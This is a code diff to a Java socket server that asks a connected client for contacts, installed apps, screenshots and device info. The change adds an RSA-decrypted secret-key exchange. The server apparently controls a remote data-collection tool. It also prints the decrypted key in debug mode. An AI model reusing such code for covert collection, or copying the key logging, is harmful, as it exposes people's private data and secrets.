@@ -6,14 +6,17 @@ import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 
+import cipher.RSADecryption;
 import elements.Contacts;
 import messages.Mensaje;
 import messages.Mensaje.RErr;
 import messages.Mensaje.RGetContact;
 import messages.Mensaje.RGetInstalledApps;
+import messages.Mensaje.RGetKey;
 import messages.Mensaje.ROk;
 import messages.Mensaje.TGetContact;
 import messages.Mensaje.TGetInstalledApps;
+import messages.Mensaje.TGetKey;
 import messages.Mensaje.TGetScreenshot;
 import messages.Mensaje.TGetInfo;
 import messages.Mensaje.RGetInfo;
@@ -27,8 +30,11 @@ public class Server {
 	protected static final int RGETINSTALLEDAPPS = 5;
 	protected static final int TGETINFO = 6;
 	protected static final int RGETINFO = 7;
-	protected static final int ROK = 7;
-	protected static final int RERR = 8;
+	protected static final int TGETKEY = 8;
+	protected static final int RGETKEY = 9;
+	protected static final int ROK = 10;
+	protected static final int RERR = 11;
+	public String secretKey = ""; 
 	ServerSocket s;
 	Socket socket;
 	OutputStream o;
@@ -49,6 +55,12 @@ public class Server {
 				System.out.println("Waiting client");
 				socket = s.accept();
 				System.out.println("Client conected");
+				String secretKeyEncrypt = getKey();
+				RSADecryption rsa = new RSADecryption();
+				secretKey = rsa.decrypt(secretKeyEncrypt);
+				if(debug){
+					System.out.println("SecretKey: " + secretKey);
+				}
 		} catch (IOException e) {
 			e.printStackTrace();
 		} catch (Exception e) {
@@ -129,6 +141,27 @@ public class Server {
 			if (reply.getType() == RGETINFO){
 				RGetInfo rinfo = (RGetInfo) reply;
 				return rinfo.getValor();
+			} else{
+				RErr err = (RErr) reply;
+				System.out.println(err.getError());
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return null;
+	}
+	
+	private String getKey(){
+		TGetKey key = new TGetKey();
+		Mensaje reply;
+		try {
+			o = socket.getOutputStream();
+			key.writeTo(o);
+			i = socket.getInputStream();
+			reply = Mensaje.readMsg(i);
+			if (reply.getType() == RGETKEY){
+				RGetKey rKey = (RGetKey) reply;
+				return rKey.getValor();
 			} else{
 				RErr err = (RErr) reply;
 				System.out.println(err.getError());
